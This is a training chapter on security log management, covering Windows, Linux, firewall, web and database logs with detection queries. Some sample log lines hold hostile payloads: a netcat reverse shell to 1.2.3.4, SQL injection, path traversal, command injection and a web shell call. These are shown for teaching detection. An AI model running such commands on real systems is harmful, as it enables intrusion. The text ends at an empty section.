# 03 - Log Management & Data Collection: The Foundation of Security Monitoring

---
title: "Log Management & Data Collection"
parent: "[[13_SOC_and_SIEM]]"
tags:
  - logs
  - data-collection
  - syslog
  - windows-events
  - log-sources
  - parsing
created: 2026-01-31
updated: 2026-01-31
---

> **Executive Summary**: Logs are the raw material of security monitoring - they tell the story of everything happening in your environment. But collecting, parsing, and managing logs at enterprise scale is a complex challenge. This chapter is your complete guide to log management: understanding different log formats, mastering collection methods, parsing complex logs, handling massive data volumes, and ensuring you capture the RIGHT data to detect attacks. Whether you're setting up your first log collector or managing petabytes of log data, this guide takes you from beginner to expert in log management - the critical foundation skill every SOC analyst must master.

---

## Table of Contents

1. [What Are Logs? (Absolute Beginner Guide)](#1-what-are-logs-absolute-beginner-guide)
2. [Why Log Management Matters for Security](#2-why-log-management-matters-for-security)
3. [Common Log Sources & Formats](#3-common-log-sources--formats)
4. [Windows Event Logs Deep Dive](#4-windows-event-logs-deep-dive)
5. [Linux/Unix Logs Deep Dive](#5-linuxunix-logs-deep-dive)
6. [Network Device Logs (Firewalls, Routers, Switches)](#6-network-device-logs)
7. [Application Logs (Web, Database, Cloud)](#7-application-logs)
8. [Log Collection Architectures](#8-log-collection-architectures)
9. [Syslog Protocol Explained](#9-syslog-protocol-explained)
10. [Windows Event Forwarding (WEF)](#10-windows-event-forwarding)
11. [Agent-Based Collection (Splunk, Elastic Beats)](#11-agent-based-collection)
12. [Cloud Log Collection (AWS, Azure, GCP)](#12-cloud-log-collection)
13. [Log Parsing & Field Extraction](#13-log-parsing--field-extraction)
14. [Log Enrichment Techniques](#14-log-enrichment-techniques)
15. [Managing High-Volume Log Data](#15-managing-high-volume-log-data)
16. [Log Retention & Compliance](#16-log-retention--compliance)
17. [Troubleshooting Log Collection](#17-troubleshooting-log-collection)
18. [Hands-On Labs & Practical Exercises](#18-hands-on-labs--practical-exercises)

---

## 1. What Are Logs? (Absolute Beginner Guide)

### 1.1 The Simple Definition

**A log is a record of an event that happened on a system.**

Think of logs like a **diary** or **journal** that computers keep:
- "At 2:00 PM, user John logged in"
- "At 2:05 PM, John opened file budget.xlsx"
- "At 2:10 PM, firewall blocked connection from 1.2.3.4"

### 1.2 Real-World Analogy

```
SECURITY GUARD LOGBOOK:
┌────────────────────────────────────────┐
│ TIME    | EVENT                        │
├────────────────────────────────────────┤
│ 08:00   | John Smith entered building  │
│ 08:15   | Jane Doe entered building    │
│ 12:00   | Unknown person at door       │
│ 12:01   | Access denied (no badge)     │
│ 17:00   | John Smith left building     │
└────────────────────────────────────────┘

COMPUTER LOG FILE:
┌────────────────────────────────────────┐
│ TIME    | EVENT                        │
├────────────────────────────────────────┤
│ 08:00   | User john logged in          │
│ 08:15   | User jane logged in          │
│ 12:00   | Failed login attempt (user:?)│
│ 12:01   | Access denied (bad password) │
│ 17:00   | User john logged off         │
└────────────────────────────────────────┘

Same concept! Logs record who did what and when.
```

### 1.3 What Information Do Logs Contain?

**The 5 W's of Logging**:

```
┌─────────────────────────────────────────────────┐
│        ESSENTIAL LOG INFORMATION                │
├─────────────────────────────────────────────────┤
│ WHO    → User/process that did something       │
│ WHAT   → Action performed                       │
│ WHEN   → Timestamp (date + time)                │
│ WHERE  → System/location                        │
│ WHY    → Result (success/failure)               │
└─────────────────────────────────────────────────┘

EXAMPLE LOG ENTRY:
Jan 31 14:23:45 web-server-01 sshd[12345]: Failed password for admin from 1.2.3.4 port 52341 ssh2

BREAKDOWN:
WHEN:  Jan 31 14:23:45
WHERE: web-server-01
WHAT:  SSH login attempt
WHO:   User "admin" from IP 1.2.3.4
WHY:   Failed (wrong password)
```

### 1.4 Why Do Systems Generate Logs?

**Four Main Reasons**:

**1. Troubleshooting**
```
Problem: Website down
Check logs: "Database connection failed at 14:23"
Solution: Restart database
```

**2. Security**
```
Detect: "1000 failed logins in 5 minutes"
Action: Block attacker
```

**3. Compliance**
```
Regulation: Must retain logs for 7 years (HIPAA, PCI-DSS)
Proof: Show auditor that you track all data access
```

**4. Performance Monitoring**
```
Track: "Web server response time increased"
Fix: Add more servers
```

---

## 2. Why Log Management Matters for Security

### 2.1 The Attack Timeline Problem

**Without Logs**:
```
ATTACK SCENARIO:
Day 1:  Attacker compromises system
Day 30: Attacker steals data
Day 90: Company discovers breach

INVESTIGATION:
Q: How did they get in?
A: No logs = NO IDEA!

Q: What data was stolen?
A: No logs = NO IDEA!

Q: When did it start?
A: No logs = NO IDEA!

RESULT: Can't stop attacker, can't prevent recurrence, massive fines
```

**With Proper Log Management**:
```
ATTACK SCENARIO:
Day 1, 14:23: Attacker sends phishing email (email logs)
Day 1, 14:25: User clicks link (proxy logs)
Day 1, 14:26: Malware downloads (firewall logs)
Day 1, 14:27: Malware executes (endpoint logs)
Day 1, 14:28: SIEM ALERTS! Attack detected!

INVESTIGATION (from logs):
✓ Entry point: Phishing email to user@company.com
✓ Malware: Downloaded from badsite.com/payload.exe
✓ Actions taken: Attempted to access file server (blocked!)
✓ Data stolen: NONE (caught in time!)

RESULT: Attack contained, full timeline documented, lessons learned
```

### 2.2 Logs Provide Evidence

**Legal & Forensics**:
```
COURT CASE:
Prosecutor: "Did the defendant access this system?"
Your logs: 
  2024-01-31 14:23:45 - User suspect logged in from 1.2.3.4
  2024-01-31 14:25:12 - User suspect accessed confidential.doc
  2024-01-31 14:26:05 - User suspect copied file to USB drive

Logs = PROOF beyond reasonable doubt
```

### 2.3 Compliance Requirements Demand Logs

**Common Compliance Mandates**:

```
┌──────────────┬────────────────────────────────────┐
│ REGULATION   │ LOG REQUIREMENTS                   │
├──────────────┼────────────────────────────────────┤
│ PCI-DSS      │ • 90 days online, 1 year archive   │
│ (Credit      │ • All access to cardholder data    │
│  Cards)      │ • Failed login attempts            │
│              │ • Admin actions                    │
├──────────────┼────────────────────────────────────┤
│ HIPAA        │ • 6 years retention                │
│ (Healthcare) │ • All patient data access          │
│              │ • System configuration changes     │
├──────────────┼────────────────────────────────────┤
│ SOX          │ • 7 years retention                │
│ (Financial)  │ • All financial system access      │
│              │ • Database changes                 │
├──────────────┼────────────────────────────────────┤
│ GDPR         │ • Document all data processing     │
│ (EU Privacy) │ • Ability to prove deletion        │
│              │ • Breach notification within 72hrs │
└──────────────┴────────────────────────────────────┘

FAILURE TO COMPLY = Massive fines (millions of dollars!)
```

### 2.4 The Value of Log Data

**Real-World Statistics**:
- **IBM**: Average cost of data breach: $4.45 million
- **Verizon DBIR**: 63% of breaches take months to discover
- **Ponemon**: Organizations with SIEM detect breaches 50% faster
- **SANS**: 80% of breaches could have been prevented with proper logging

**Translation**: Good log management = Save millions, detect faster, prevent breaches

---

## 3. Common Log Sources & Formats

### 3.1 Log Source Categories

```
┌──────────────────────────────────────────────────┐
│          LOG SOURCE PYRAMID                      │
└──────────────────────────────────────────────────┘

              [USER ACTIVITY]
              • VPN logins
              • Email access
                    │
         ┌──────────┴──────────┐
    [APPLICATIONS]      [ENDPOINTS]
    • Web servers       • Laptops
    • Databases         • Desktops
    • Email             • Servers
         │                   │
         └────────┬──────────┘
              [NETWORK]
           • Firewalls
           • Routers
           • IDS/IPS
                │
         [INFRASTRUCTURE]
         • Active Directory
         • DNS
         • DHCP
```

### 3.2 Log Format Types

**1. Plain Text (Human Readable)**
```
EXAMPLE:
Jan 31 14:23:45 server1 sshd[1234]: Failed password for root

PROS:
✓ Easy to read
✓ Universal (any tool can read)

CONS:
✗ Not structured
✗ Hard to parse programmatically
✗ Format varies by application
```

**2. Syslog (Standard Format)**
```
EXAMPLE:
<34>Jan 31 14:23:45 server1 sshd[1234]: Failed password for root

STRUCTURE:
<priority> timestamp hostname process[pid]: message

PROS:
✓ Standardized
✓ Widely supported
✓ Network-ready (UDP/TCP)

CONS:
✗ Limited structure
✗ No field names
```

**3. JSON (Structured)**
```
EXAMPLE:
{
  "timestamp": "2024-01-31T14:23:45Z",
  "hostname": "server1",
  "process": "sshd",
  "pid": 1234,
  "event": "authentication_failure",
  "user": "root",
  "src_ip": "1.2.3.4"
}

PROS:
✓ Fully structured
✓ Field names included
✓ Easy to parse
✓ Modern applications use it

CONS:
✗ Larger size (verbose)
✗ Legacy systems don't support it
```

**4. XML (Structured)**
```
EXAMPLE:
<Event>
  <Timestamp>2024-01-31T14:23:45Z</Timestamp>
  <Hostname>server1</Hostname>
  <Process>sshd</Process>
  <User>root</User>
  <Result>failure</Result>
</Event>

PROS:
✓ Structured
✓ Self-documenting

CONS:
✗ Very verbose (large size)
✗ Slower to parse
✗ Less popular than JSON
```

**5. Binary (Windows EVTX)**
```
EXAMPLE: (not human-readable)
Binary format used by Windows Event Viewer

PROS:
✓ Compact (small size)
✓ Fast to write

CONS:
✗ Requires special tools to read
✗ Not human-readable
```

### 3.3 Log Format Comparison

```
┌─────────────┬────────────┬───────────┬──────────┐
│ FORMAT      │ READABLE   │ PARSEABLE │ SIZE     │
├─────────────┼────────────┼───────────┼──────────┤
│ Plain Text  │ ⭐⭐⭐⭐⭐ │ ⭐⭐      │ Medium   │
│ Syslog      │ ⭐⭐⭐⭐   │ ⭐⭐⭐    │ Medium   │
│ JSON        │ ⭐⭐⭐     │ ⭐⭐⭐⭐⭐ │ Large    │
│ XML         │ ⭐⭐       │ ⭐⭐⭐⭐   │ X-Large  │
│ Binary      │ ⭐         │ ⭐⭐⭐⭐   │ Small    │
└─────────────┴────────────┴───────────┴──────────┘
```

---

## 4. Windows Event Logs Deep Dive

### 4.1 What Are Windows Event Logs?

**Definition**: Windows' built-in logging system that records system, security, and application events.

**Location**: 
```
GUI: Event Viewer (eventvwr.msc)
Files: C:\Windows\System32\winevt\Logs\*.evtx
Format: Binary (requires Event Viewer or PowerShell to read)
```

### 4.2 Main Windows Event Log Categories

```
┌──────────────────────────────────────────────────┐
│        WINDOWS EVENT LOG CATEGORIES              │
├──────────────────────────────────────────────────┤
│                                                  │
│ 1. SECURITY                                      │
│    • Logins/logoffs                              │
│    • Failed authentication                       │
│    • Account changes                             │
│    • File access (if auditing enabled)           │
│    • Privilege use                               │
│    ⚠️ MOST IMPORTANT FOR SECURITY!              │
│                                                  │
│ 2. SYSTEM                                        │
│    • Service start/stop                          │
│    • Driver loading                              │
│    • System startup/shutdown                     │
│    • Disk errors                                 │
│                                                  │
│ 3. APPLICATION                                   │
│    • Application crashes                         │
│    • Application errors                          │
│    • Custom application logs                     │
│                                                  │
│ 4. SETUP                                         │
│    • Software installation                       │
│    • Windows updates                             │
│                                                  │
│ 5. FORWARDED EVENTS                              │
│    • Logs from other systems (via WEF)           │
│                                                  │
└──────────────────────────────────────────────────┘
```

### 4.3 Critical Security Event IDs (You MUST Memorize These!)

```
┌──────────┬──────────────────────────────────────┐
│ EVENT ID │ DESCRIPTION                          │
├──────────┼──────────────────────────────────────┤
│ 4624     │ ✅ SUCCESSFUL LOGIN                  │
│          │ (Most common - track who logs in)    │
├──────────┼──────────────────────────────────────┤
│ 4625     │ ❌ FAILED LOGIN                      │
│          │ (Brute force detection)              │
├──────────┼──────────────────────────────────────┤
│ 4634     │ 🚪 LOGOFF                            │
│          │ (User session ended)                 │
├──────────┼──────────────────────────────────────┤
│ 4672     │ 👑 ADMIN PRIVILEGE ASSIGNED          │
│          │ (User logged in with admin rights)   │
├──────────┼──────────────────────────────────────┤
│ 4720     │ 👤 USER ACCOUNT CREATED              │
│          │ (New account added)                  │
├──────────┼──────────────────────────────────────┤
│ 4728     │ 👥 USER ADDED TO SECURITY GROUP      │
│          │ (Privilege escalation!)              │
├──────────┼──────────────────────────────────────┤
│ 4732     │ 👥 USER ADDED TO LOCAL GROUP         │
│          │ (Local admin added)                  │
├──────────┼──────────────────────────────────────┤
│ 4648     │ 🔐 LOGON WITH EXPLICIT CREDENTIALS   │
│          │ (RunAs or Pass-the-Hash)             │
├──────────┼──────────────────────────────────────┤
│ 4688     │ 🔧 PROCESS CREATED                   │
│          │ (Program executed - malware hunting) │
├──────────┼──────────────────────────────────────┤
│ 4697     │ ⚙️ SERVICE INSTALLED                 │
│          │ (Persistence mechanism)              │
├──────────┼──────────────────────────────────────┤
│ 4769     │ 🎫 KERBEROS TICKET REQUESTED         │
│          │ (Kerberoasting detection)            │
├──────────┼──────────────────────────────────────┤
│ 5140     │ 📁 NETWORK SHARE ACCESSED            │
│          │ (File server access)                 │
├──────────┼──────────────────────────────────────┤
│ 7045     │ ⚙️ SERVICE INSTALLED (System log)    │
│          │ (Malware persistence)                │
└──────────┴──────────────────────────────────────┘
```

### 4.4 Understanding Event ID 4624 (Successful Login)

**Raw Event**:
```
Event ID: 4624
Log: Security
Source: Microsoft-Windows-Security-Auditing
Date: 1/31/2024 2:23:45 PM
Computer: DC01.company.com

An account was successfully logged on.

Subject:
  Security ID: SYSTEM
  Account Name: DC01$
  Account Domain: COMPANY

Logon Information:
  Logon Type: 3
  Account Name: john
  Account Domain: COMPANY
  Logon GUID: {00000000-0000-0000-0000-000000000000}

Network Information:
  Workstation Name: LAPTOP-05
  Source Network Address: 192.168.1.105
  Source Port: 52341

Detailed Authentication Information:
  Logon Process: NtLmSsp
  Authentication Package: NTLM
```

**What This Tells Us**:
```
WHO: User "john" from domain COMPANY
WHAT: Logged in successfully
WHEN: 1/31/2024 2:23:45 PM
WHERE: To server DC01 from LAPTOP-05 (IP: 192.168.1.105)
HOW: Network logon (Type 3) using NTLM authentication

LOGON TYPES (Important!):
Type 2  = Interactive (physical keyboard login)
Type 3  = Network (accessing file share)
Type 4  = Batch (scheduled task)
Type 5  = Service (service startup)
Type 7  = Unlock (screen unlock)
Type 10 = Remote Desktop (RDP)
```

### 4.5 Analyzing Event ID 4625 (Failed Login)

**Example Failed Login**:
```
Event ID: 4625
An account failed to log on.

Subject:
  Account Name: -

Logon Type: 3

Account For Which Logon Failed:
  Account Name: admin
  Account Domain: COMPANY

Failure Information:
  Failure Reason: Unknown user name or bad password
  Status: 0xC000006D
  Sub Status: 0xC000006A

Network Information:
  Workstation Name: -
  Source Network Address: 203.0.113.45
  Source Port: 44821
```

**Analysis**:
```
🚨 ALERT INDICATORS:
✗ External IP (203.0.113.45) - suspicious!
✗ Account: "admin" - common brute force target
✗ Logon Type 3 - network login attempt
✗ Status 0xC000006D - Bad username/password

IF: Multiple 4625 events from same IP in short time
THEN: BRUTE FORCE ATTACK!

ACTION:
1. Block source IP at firewall
2. Check if any successful logins followed (Event 4624)
3. If yes, account likely compromised!
```

### 4.6 Enabling Advanced Windows Logging

**By Default**: Windows logs very little!

**You Must Enable**:
```
GROUP POLICY SETTINGS TO ENABLE:

Computer Configuration → Windows Settings → 
Security Settings → Advanced Audit Policy Configuration

CRITICAL SETTINGS:
✅ Audit Logon Events (Success + Failure)
✅ Audit Account Logon Events (Success + Failure)
✅ Audit Account Management (Success + Failure)
✅ Audit Process Creation (Success) - for 4688
✅ Audit Privilege Use (Success + Failure)
✅ Audit Detailed File Share (Success + Failure) - for 5140
✅ Audit Security Group Management (Success)

COMMAND LINE LOGGING (Critical for malware detection!):
Computer Configuration → Administrative Templates → 
System → Audit Process Creation
Enable: "Include command line in process creation events"

NOW Event 4688 will show FULL command including arguments!
Example: powershell.exe -enc [base64_malware]
```

### 4.7 Reading Windows Logs with PowerShell

**Basic Commands**:

```powershell
# Get failed logins from last 24 hours
Get-EventLog -LogName Security -InstanceId 4625 -After (Get-Date).AddDays(-1)

# Get successful logins for specific user
Get-EventLog -LogName Security -InstanceId 4624 | Where-Object {$_.Message -like "*john*"}

# Get last 10 security events
Get-EventLog -LogName Security -Newest 10

# Export security logs to CSV
Get-EventLog -LogName Security -After (Get-Date).AddHours(-1) | 
  Export-Csv -Path "C:\logs\security_export.csv"

# Search for specific Event ID with filtering
Get-WinEvent -FilterHashtable @{
  LogName='Security'
  ID=4625
  StartTime=(Get-Date).AddHours(-24)
} | Format-Table TimeCreated, Message -AutoSize
```

**Advanced: Find All Failed Logins from External IPs**:
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} | 
  ForEach-Object {
    $xml = [xml]$_.ToXml()
    $ip = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'IpAddress'} | Select -ExpandProperty '#text'
    if ($ip -notlike "192.168.*" -and $ip -notlike "10.*") {
      [PSCustomObject]@{
        Time = $_.TimeCreated
        User = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'} | Select -ExpandProperty '#text'
        IP = $ip
      }
    }
  } | Format-Table
```

---

## 5. Linux/Unix Logs Deep Dive

### 5.1 Linux Log File Locations

```
┌──────────────────────────────────────────────────┐
│        LINUX LOG FILE LOCATIONS                  │
├──────────────────────────────────────────────────┤
│                                                  │
│ /var/log/auth.log (Debian/Ubuntu)               │
│ /var/log/secure (RedHat/CentOS)                 │
│   → Authentication attempts (SSH, sudo)          │
│   ⚠️ CRITICAL FOR SECURITY                      │
│                                                  │
│ /var/log/syslog (Debian/Ubuntu)                 │
│ /var/log/messages (RedHat/CentOS)               │
│   → General system messages                      │
│                                                  │
│ /var/log/kern.log                                │
│   → Kernel messages, hardware events             │
│                                                  │
│ /var/log/apache2/ (or /var/log/httpd/)          │
│   → Web server access and error logs             │
│                                                  │
│ /var/log/mysql/ (or /var/log/mariadb/)          │
│   → Database logs                                │
│                                                  │
│ /var/log/audit/audit.log                        │
│   → Linux audit daemon (auditd) logs             │
│   → Detailed security auditing                   │
│                                                  │
│ /var/log/cron                                    │
│   → Scheduled task execution                     │
│                                                  │
│ journalctl (systemd)                             │
│   → Modern logging system (replaces many above)  │
│                                                  │
└──────────────────────────────────────────────────┘
```

### 5.2 Reading auth.log (Authentication Logs)

**Location**: `/var/log/auth.log` (Ubuntu) or `/var/log/secure` (CentOS)

**Sample Logs**:
```
SUCCESSFUL SSH LOGIN:
Jan 31 14:23:45 web-server sshd[12345]: Accepted password for john from 192.168.1.105 port 52341 ssh2

BREAKDOWN:
Timestamp: Jan 31 14:23:45
Hostname: web-server
Process: sshd (SSH daemon)
PID: 12345
Event: Accepted password
User: john
Source: 192.168.1.105 port 52341
Protocol: ssh2
```

```
FAILED SSH LOGIN:
Jan 31 14:25:12 web-server sshd[12346]: Failed password for admin from 203.0.113.45 port 44821 ssh2

🚨 SUSPICIOUS! External IP, common username "admin"
```

```
SUDO USAGE (PRIVILEGE ESCALATION):
Jan 31 14:30:00 web-server sudo: john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/bin/cat /etc/shadow

BREAKDOWN:
User "john" used sudo to run: cat /etc/shadow (view password hashes!)
⚠️ Potentially malicious - stealing password hashes
```

```
USER ADDED TO SUDO GROUP:
Jan 31 14:35:22 web-server usermod[12456]: add 'bob' to group 'sudo'

🚨 ALERT! User bob given admin privileges
```

### 5.3 Common Linux Log Patterns to Detect Attacks

**1. Brute Force SSH Attack**:
```
COMMAND: grep "Failed password" /var/log/auth.log | tail -20

OUTPUT:
Jan 31 14:20:01 server sshd: Failed password for root from 1.2.3.4
Jan 31 14:20:03 server sshd: Failed password for root from 1.2.3.4
Jan 31 14:20:05 server sshd: Failed password for root from 1.2.3.4
... (repeated 50 times!)

DETECTION: Multiple failed attempts from same IP
```

**2. Find All Successful Logins from External IPs**:
```bash
grep "Accepted password" /var/log/auth.log | grep -v "192.168\|10\." | awk '{print $1, $2, $3, $11, $13}'

OUTPUT:
Jan 31 14:45:22 john 203.0.113.45
Jan 31 15:12:05 admin 198.51.100.22

🚨 External IPs logged in successfully - investigate!
```

**3. Detect Port Scanning (from kernel logs)**:
```bash
grep "SYN flood" /var/log/kern.log

OUTPUT:
Jan 31 14:50:33 kernel: TCP: Possible SYN flooding on port 80. Dropping request.

MEANING: Someone is port scanning or DDoS attacking
```

**4. Find All Sudo Commands Run**:
```bash
grep "COMMAND" /var/log/auth.log | tail -20

OUTPUT:
Jan 31 14:55:01 sudo: john : COMMAND=/usr/bin/apt-get update
Jan 31 15:00:15 sudo: bob : COMMAND=/bin/nc -e /bin/sh 1.2.3.4 4444

🚨 ALERT! Bob opened reverse shell (netcat) - MALICIOUS!
```

### 5.4 Using journalctl (Systemd Journal)

**Modern Linux systems use systemd journalctl instead of plain text logs**

**Basic Commands**:
```bash
# View all logs (like 'tail -f /var/log/syslog')
journalctl -f

# View logs from last hour
journalctl --since "1 hour ago"

# View logs for specific service (e.g., SSH)
journalctl -u sshd

# View logs with priority ERROR and higher
journalctl -p err

# View kernel messages only
journalctl -k

# View logs from specific date/time range
journalctl --since "2024-01-31 14:00:00" --until "2024-01-31 15:00:00"

# Export to JSON (for SIEM ingestion)
journalctl -o json > logs.json

# Follow logs for specific user
journalctl _UID=1000 -f

# Show boot logs
journalctl -b
```

**Security-Focused Queries**:
```bash
# Find all authentication failures
journalctl | grep -i "failed\|failure\|error" | grep -i "auth\|login\|password"

# Find all sudo usage
journalctl | grep sudo | grep COMMAND

# Find all service starts/stops (potential persistence)
journalctl | grep -i "started\|stopped" | grep service
```

### 5.5 Linux Audit Daemon (auditd) for Advanced Logging

**What is auditd?**
Advanced logging system for detailed security auditing (records EVERYTHING).

**Install**:
```bash
# Ubuntu/Debian
sudo apt-get install auditd

# CentOS/RedHat
sudo yum install audit
```

**Enable File Access Auditing**:
```bash
# Watch who accesses /etc/passwd
sudo auditctl -w /etc/passwd -p war -k passwd_changes

# Watch who accesses /etc/shadow (password hashes)
sudo auditctl -w /etc/shadow -p war -k shadow_access

# Watch who executes sudo
sudo auditctl -w /usr/bin/sudo -p x -k sudo_usage

# Watch a directory for file creations/deletions
sudo auditctl -w /var/www/html -p wa -k webserver_changes
```

**Search Audit Logs**:
```bash
# Find all /etc/shadow access
sudo ausearch -k shadow_access

# Find all sudo executions
sudo ausearch -k sudo_usage

# Find all actions by specific user
sudo ausearch -ua john

# Generate audit report
sudo aureport --auth
```

**Example Audit Log Entry**:
```
type=SYSCALL msg=audit(1706716425.123:456): arch=c000003e syscall=2 success=yes exit=3 a0=7ffd12345678 a1=0 a2=1b6 a3=7ffd87654321 items=1 ppid=1234 pid=5678 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=4 comm="cat" exe="/bin/cat" key="shadow_access"

TRANSLATION:
User (uid=1000) used 'sudo' (uid=0) to execute 'cat' on a file
Key: shadow_access (our watch rule triggered!)
```

---

## 6. Network Device Logs (Firewalls, Routers, Switches)

### 6.1 Firewall Log Anatomy

**Example: Palo Alto Firewall Log**
```
TRAFFIC LOG (Allow):
2024/01/31 14:23:45,TRAFFIC,end,2024/01/31 14:23:45,192.168.1.105,10.0.0.50,0.0.0.0,0.0.0.0,Allow Internet,,,web-browsing,vsys1,trust,untrust,ethernet1/1,ethernet1/2,Forward to SIEM,2024/01/31 14:23:45,156234,1,52341,443,0,0,0x0,tcp,allow,1024,1024,0,3,2024/01/31 14:23:43,0,any,0,987654321,0x0,192.168.0.0-192.168.255.255,United States,0,3,0,aged-out,0,0,0,0,,PA-VM,from-policy

BREAKDOWN (CSV format):
Field 1:  Timestamp - 2024/01/31 14:23:45
Field 2:  Log Type - TRAFFIC
Field 3:  Subtype - end (connection ended)
Field 5:  Source IP - 192.168.1.105 (internal user)
Field 6:  Destination IP - 10.0.0.50 (where they connected)
Field 9:  Rule Name - "Allow Internet"
Field 13: Application - web-browsing (HTTP/HTTPS)
Field 24: Source Port - 52341
Field 25: Dest Port - 443 (HTTPS)
Field 28: Protocol - tcp
Field 29: Action - allow
```

**Example: Deny Log (Blocked Connection)**
```
2024/01/31 14:25:33,TRAFFIC,drop,2024/01/31 14:25:33,203.0.113.45,10.0.1.50,0.0.0.0,0.0.0.0,Deny Inbound,,,ssh,vsys1,untrust,dmz,ethernet1/2,ethernet1/3,Forward to SIEM,2024/01/31 14:25:33,0,1,44821,22,0,0,0x0,tcp,deny,60,60,0,1,2024/01/31 14:25:33,0,any,0,123456789,0x0,Russia,United States,0,1,0,policy-deny

🚨 ATTACK DETECTED:
Source: 203.0.113.45 (Russia)
Destination: 10.0.1.50 (internal server)
Port: 22 (SSH)
Action: DENIED
Meaning: External attacker tried to SSH into your server (blocked!)
```

### 6.2 Common Firewall Log Fields

```
┌──────────────────┬────────────────────────────────┐
│ FIELD            │ PURPOSE                        │
├──────────────────┼────────────────────────────────┤
│ timestamp        │ When event occurred            │
│ src_ip           │ Who initiated connection       │
│ dst_ip           │ Where they connected to        │
│ src_port         │ Source port (usually random)   │
│ dst_port         │ Service port (22=SSH, 443=HTTPS│
│ protocol         │ TCP, UDP, ICMP                 │
│ action           │ allow, deny, drop              │
│ bytes_sent       │ Data volume (detect exfil)     │
│ bytes_received   │ Data volume                    │
│ rule_name        │ Which firewall rule triggered  │
│ threat_name      │ If threat detected             │
│ category         │ URL category (malware, phish)  │
│ application      │ Identified app (ssh, http, etc)│
└──────────────────┴────────────────────────────────┘
```

### 6.3 Threat Logs (IDS/IPS Alerts)

**Example: Malware Download Blocked**
```
2024/01/31 14:30:00,THREAT,url,2024/01/31 14:30:00,192.168.1.105,203.0.113.100,0.0.0.0,0.0.0.0,Block Malware,,,web-browsing,vsys1,trust,untrust,ethernet1/1,ethernet1/2,Forward to SIEM,2024/01/31 14:30:00,245612,1,52468,80,0,0,0x0,tcp,alert,http://badsite.com/malware.exe,Malware Download Attempt,malware,informational,client-to-server,987654321,0x8000000000000000,192.168.0.0-192.168.255.255,United States,0

ALERT DETAILS:
User: 192.168.1.105 (internal)
Attempted to download: http://badsite.com/malware.exe
Category: malware
Action: alert (and blocked)
Threat: Malware Download Attempt

RESPONSE NEEDED:
1. Investigate user's system (192.168.1.105)
2. Check if malware executed
3. Scan for other malicious activity
```

### 6.4 Parsing Firewall Logs

**Many formats exist**:

**Syslog Format (Generic)**:
```
<134>Jan 31 14:23:45 firewall01 %ASA-6-302013: Built inbound TCP connection 123456 for outside:1.2.3.4/52341 (1.2.3.4/52341) to inside:10.0.0.50/443 (10.0.0.50/443)
```

**CEF (Common Event Format)**:
```
CEF:0|Palo Alto Networks|PAN-OS|9.0.0|TRAFFIC|end|3|rt=Jan 31 2024 14:23:45 src=192.168.1.105 dst=10.0.0.50 spt=52341 dpt=443 proto=TCP act=allowed
```

**LEEF (Log Event Extended Format)**:
```
LEEF:1.0|Palo Alto|PAN-OS|9.0|traffic|src=192.168.1.105 dst=10.0.0.50 spt=52341 dpt=443 proto=TCP action=allow
```

**JSON (Modern)**:
```json
{
  "timestamp": "2024-01-31T14:23:45Z",
  "src_ip": "192.168.1.105",
  "dst_ip": "10.0.0.50",
  "src_port": 52341,
  "dst_port": 443,
  "protocol": "TCP",
  "action": "allow",
  "bytes": 1024,
  "threat": null
}
```

---

## 7. Application Logs (Web, Database, Cloud)

### 7.1 Web Server Logs (Apache/Nginx)

**Apache Access Log (Combined Format)**:
```
LOG ENTRY:
192.168.1.105 - john [31/Jan/2024:14:23:45 +0000] "GET /admin/users.php HTTP/1.1" 200 2048 "http://company.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

BREAKDOWN:
192.168.1.105          = Client IP
john                   = Authenticated user (or - if none)
31/Jan/2024:14:23:45   = Timestamp
GET                    = HTTP method
/admin/users.php       = Requested URL
HTTP/1.1               = Protocol
200                    = Status code (200 = success)
2048                   = Response size (bytes)
http://company.com/    = Referrer (where they came from)
Mozilla/5.0...         = User-Agent (browser)
```

**Detecting Web Attacks in Logs**:

**SQL Injection Attempt**:
```
192.168.1.105 - - [31/Jan/2024:14:25:00 +0000] "GET /search.php?q=admin'+OR+1=1-- HTTP/1.1" 200 1234

🚨 ATTACK DETECTED:
URL contains: admin' OR 1=1--
This is SQL injection syntax!
Action: Alert, block IP, patch application
```

**Directory Traversal Attack**:
```
203.0.113.45 - - [31/Jan/2024:14:26:15 +0000] "GET /../../../../etc/passwd HTTP/1.1" 404 162

🚨 ATTACK: Trying to access /etc/passwd via directory traversal
```

**Command Injection**:
```
203.0.113.45 - - [31/Jan/2024:14:27:30 +0000] "GET /cgi-bin/test.cgi?cmd=;cat%20/etc/passwd HTTP/1.1" 500 0

🚨 ATTACK: URL contains shell command (cat /etc/passwd)
```

**Web Shell Upload**:
```
192.168.1.105 - hacker [31/Jan/2024:14:30:00 +0000] "POST /upload.php HTTP/1.1" 200 45
192.168.1.105 - hacker [31/Jan/2024:14:30:05 +0000] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 128

🚨 ATTACK CHAIN:
1. Uploaded file (shell.php)
2. Accessed it with command parameter
= WEB SHELL BACKDOOR!
```

**Brute Force Login Attempts**:
```
203.0.113.45 - - [31/Jan/2024:14:35:01 +0000] "POST /login.php HTTP/1.1" 401 512
203.0.113.45 - - [31/Jan/2024:14:35:02 +0000] "POST /login.php HTTP/1.1" 401 512
203.0.113.45 - - [31/Jan/2024:14:35:03 +0000] "POST /login.php HTTP/1.1" 401 512
(repeated 100 times)

🚨 BRUTE FORCE: Multiple 401 (unauthorized) from same IP
```

### 7.2 Database Logs (MySQL/PostgreSQL/SQL Server)

**MySQL General Query Log**:
```
ENABLE:
SET GLOBAL general_log = 'ON';
SET GLOBAL log_output = 'FILE';

LOG LOCATION:
/var/log/mysql/mysql.log

SAMPLE LOG:
2024-01-31T14:23:45.123456Z 123 Query SELECT * FROM users WHERE username='admin' AND password='password123'
2024-01-31T14:24:12.456789Z 124 Query DROP TABLE users; -- MALICIOUS!
```

**Detecting Database Attacks**:

**SQL Injection via Application**:
```
2024-01-31T14:25:00.123Z 125 Query SELECT * FROM users WHERE id='1' OR '1'='1'

🚨 SQL INJECTION: OR '1'='1' always true
```

**Unauthorized Data Access**:
```
2024-01-31T14:26:30.456Z 126 Query SELECT * FROM credit_cards WHERE 1=1

🚨 ALERT: SELECT * from sensitive table (credit_cards)
User: Check which application/user ran this
```

**Data Exfiltration**:
```
